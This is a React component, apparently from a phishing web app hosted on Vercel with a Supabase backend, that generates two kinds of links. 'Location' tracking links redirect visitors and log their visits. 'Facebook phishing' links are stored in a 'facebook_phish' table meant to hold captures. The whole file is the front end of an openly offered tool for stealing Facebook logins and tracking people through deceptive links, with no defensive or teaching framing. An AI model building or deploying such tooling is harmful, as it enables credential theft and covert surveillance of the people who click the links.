import React, { useState } from 'react';
import { supabase } from '../supabase';

export default function LinkGenerator({ onNewLink, onlyFacebook }) {
  const [link, setLink] = useState('');
  const [destino, setDestino] = useState('');
  const [erro, setErro] = useState('');
  const [tipo, setTipo] = useState(onlyFacebook ? 'facebook' : 'location'); // 'location' ou 'facebook'

  // Se onlyFacebook, sempre força tipo facebook
  if (onlyFacebook && tipo !== 'facebook') setTipo('facebook');

  async function gerarLink() {
    setErro('');
    const id = Math.random().toString(36).substring(2, 10);
    let url = '';
    if (tipo === 'location') {
      if (!destino || !/^https?:\/\//.test(destino)) {
        setErro('Enter a valid destination URL (e.g. https://globo.com)');
        return;
      }
      url = 'https://redirect-online.vercel.app/redirect/' + id;
      setLink(url);
      const { error } = await supabase.from('links').insert([
        { id, url, destino, acessos: [] }
      ]);
      if (error) {
        setErro('Error saving link: ' + error.message);
        console.error('Supabase insert error:', error);
        return;
      }
    } else if (tipo === 'facebook') {
      url = 'https://redirect-online.vercel.app/facebook/' + id;
      setLink(url);
      const { error } = await supabase.from('facebook_phish').insert([
        { id, url, capturas: [] }
      ]);
      if (error) {
        setErro('Error saving phishing link: ' + error.message);
        console.error('Supabase insert error:', error);
        return;
      }
    }
    if (onNewLink) onNewLink();
  }

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      {!onlyFacebook && (
        <div style={{ marginBottom: 12 }}>
          <label>
            <input type="radio" checked={tipo === 'location'} onChange={() => setTipo('location')} /> Location Link
          </label>
          <label style={{ marginLeft: 16 }}>
            <input type="radio" checked={tipo === 'facebook'} onChange={() => setTipo('facebook')} /> Facebook Phishing
          </label>
        </div>
      )}
      {tipo === 'location' && !onlyFacebook && (
        <input
          type="text"
          placeholder="Destination URL (e.g. https://globo.com)"
          value={destino}
          onChange={e => setDestino(e.target.value)}
          style={{
            padding: '0.5rem 1rem',
            borderRadius: 8,
            border: '1px solid var(--cinza-conspiracao)',
            marginRight: 10,
            width: 320,
            maxWidth: '90vw',
            fontSize: 16
          }}
        />
      )}
      <button onClick={gerarLink} style={{
        background: 'var(--vermelho-paixao)',
        color: 'var(--branco-confissao)',
        borderRadius: 8,
        padding: '0.75rem 2rem',
        fontFamily: 'Montserrat',
        fontWeight: 'bold',
        fontSize: '1.1rem',
        border: 'none',
        cursor: 'pointer',
        transition: 'background 0.2s',
        marginTop: 8
      }}>{onlyFacebook ? 'Generate Facebook link' : (tipo === 'location' ? 'Generate tracking link' : 'Generate Facebook phishing link')}</button>
      {erro && <div style={{ color: 'var(--erro)', marginTop: 8 }}>{erro}</div>}
      {link && (
        <div style={{ marginTop: 20 }}>
          <span style={{ color: 'var(--ouro-tentacao)' }}>Your link:</span><br />
          <a href={link} target="_blank" rel="noopener noreferrer" style={{ fontSize: 18 }}>{link}</a>
        </div>
      )}
    </div>
  );
}